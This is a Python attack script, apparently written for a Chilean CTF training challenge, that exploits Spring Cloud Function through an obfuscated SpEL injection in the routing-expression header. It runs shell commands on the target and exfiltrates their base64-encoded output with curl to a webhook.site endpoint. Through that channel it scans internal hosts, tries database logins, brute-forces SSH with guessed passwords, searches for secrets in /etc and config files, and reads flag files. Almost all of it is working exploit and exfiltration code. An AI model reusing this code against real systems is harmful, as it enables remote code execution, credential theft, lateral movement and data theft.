#!/usr/bin/env python3
"""
CTF Chile - Explorar vectores de ataque alternativos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Explorando vectores de ataque alternativos...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=25)
        print(f"    [+] {tag:45} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Escaneo exhaustivo de puertos en hosts internos...")

# Escaneo más detallado de puertos
hosts = ["10.160.209.1", "10.109.220.1"]
important_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5984, 6379, 8000, 8080, 8443, 9000, 9200, 27017]

for host in hosts:
    host_safe = host.replace(".", "_")
    probe(f"fullscan_{host_safe}", f"timeout 30 nmap -p {','.join(map(str, important_ports[:20]))} {host} 2>/dev/null | grep open")

print("[*] FASE 2: Probar servicios de base de datos con credenciales JMX...")

# Conexiones a bases de datos comunes
db_tests = [
    ("mysql", "3306", "monitor", "QED"),
    ("mysql", "3306", "control", "R&D"),
    ("postgresql", "5432", "monitor", "QED"),
    ("redis", "6379", "QED"),
    ("mongodb", "27017", "monitor:QED")
]

for host in hosts:
    host_safe = host.replace(".", "_")

    # MySQL
    probe(f"mysql_{host_safe}_monitor", f"timeout 10 mysql -h{host} -umonitor -pQED -e 'SHOW DATABASES;' 2>/dev/null || echo 'MYSQL_FAILED'")

    # PostgreSQL
    probe(f"postgres_{host_safe}_monitor", f"timeout 10 PGPASSWORD=QED psql -h {host} -U monitor -d postgres -c '\\l' 2>/dev/null || echo 'POSTGRES_FAILED'")

    # Redis
    probe(f"redis_{host_safe}", f"timeout 10 redis-cli -h {host} -a QED info 2>/dev/null || echo 'REDIS_FAILED'")

print("[*] FASE 3: Intentar conexiones SSH con más credenciales...")

# Credenciales adicionales basadas en el contexto
additional_creds = [
    ("omnivault", "omnivault"),
    ("banco", "banco"),
    ("vault", "vault123"),
    ("admin", "omnivault"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "password"),
    ("service", "service")
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for user, password in additional_creds[:4]:  # Solo las primeras 4
        probe(f"ssh_alt_{host_safe}_{user}", f"timeout 8 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{host} 'echo SSH_SUCCESS_{user}_{host} && whoami && hostname' 2>/dev/null || echo 'SSH_FAILED_{user}:{password}@{host}'")

print("[*] FASE 4: Buscar otros servicios web en puertos alternativos...")

# Puertos web alternativos
web_ports = [3000, 5000, 8001, 8081, 8888, 9001, 4000, 7000]

for host in hosts:
    host_safe = host.replace(".", "_")
    for port in web_ports[:4]:  # Solo los primeros 4
        probe(f"web_alt_{host_safe}_{port}", f"timeout 8 curl -s -I http://{host}:{port}/ 2>/dev/null | head -3")

print("[*] FASE 5: Explorar protocolos de administración...")

# Protocolos de administración comunes
for host in hosts:
    host_safe = host.replace(".", "_")

    # SNMP
    probe(f"snmp_{host_safe}", f"timeout 10 snmpwalk -v2c -c public {host} 1.3.6.1.2.1.1.1 2>/dev/null | head -3")

    # JMX (Java Management Extensions)
    probe(f"jmx_{host_safe}", f"timeout 10 nc -zv {host} 1099 8686 9999 2>&1 | grep succeeded")

print("[*] FASE 6: Buscar archivos de configuración específicos del entorno...")

# Archivos que podrían revelar credenciales o endpoints
config_searches = [
    "find /tmp -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null",
    "find /var -name 'application*' -o -name 'bootstrap*' 2>/dev/null | head -5",
    "grep -r 'api.key\\|secret\\|token' /etc 2>/dev/null | head -5",
    "find / -name 'docker-compose*' -o -name 'Dockerfile*' 2>/dev/null | head -5"
]

for i, search_cmd in enumerate(config_searches):
    probe(f"config_search_{i}", search_cmd)

print("[*] FASE 7: Verificar si hay flags en ubicaciones obvias...")

# Ubicaciones donde podrían estar las flags
flag_locations = [
    "/flag.txt", "/root/flag.txt", "/home/flag.txt", "/tmp/flag.txt",
    "/app/flag.txt", "/var/flag.txt", "/opt/flag.txt", "/etc/flag.txt"
]

for loc in flag_locations:
    loc_safe = loc.replace("/", "_")
    probe(f"flag_loc{loc_safe}", f"cat {loc} 2>/dev/null || echo 'NOT_FOUND_{loc}'")

print("[*] FASE 8: Intentar comunicación directa entre contenedores...")

# Probar comunicación directa
probe("container_to_container_1", "curl -s -m 5 http://10.160.209.1:8000/docs 2>/dev/null | head -10")
probe("container_to_container_2", "curl -s -m 5 http://10.109.220.1:8000/docs 2>/dev/null | head -10")

time.sleep(30)

# Recoger y analizar respuestas
print("\n[*] Analizando vectores alternativos...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=60", timeout=25)
data = r.json().get("data", [])

new_services = []
database_access = []
ssh_successes = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar servicios nuevos
            if any(keyword in decoded.lower() for keyword in ["open", "succeeded", "connected"]):
                new_services.append((path, decoded))
                print("🔍 NUEVO SERVICIO DETECTADO")

            # Detectar acceso a base de datos
            if any(keyword in decoded.lower() for keyword in ["database", "schema", "table", "collection"]):
                if "FAILED" not in decoded:
                    database_access.append((path, decoded))
                    print("🗄️ ACCESO A BASE DE DATOS")

            # Detectar SSH exitoso
            if "SSH_SUCCESS" in decoded:
                ssh_successes.append((path, decoded))
                print("🔑 SSH EXITOSO")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE VECTORES ALTERNATIVOS")
print("="*70)

if new_services:
    print(f"🔍 NUEVOS SERVICIOS: {len(new_services)}")
    for path, content in new_services:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if database_access:
    print(f"\n🗄️ ACCESO A BASES DE DATOS: {len(database_access)}")
    for path, content in database_access:
        print(f"    ✅ {path}")
        print(f"       {content[:150]}...")

if ssh_successes:
    print(f"\n🔑 SSH EXITOSO: {len(ssh_successes)}")
    for path, content in ssh_successes:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 Continuar explorando - quizás la autenticación requiere un flujo específico.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")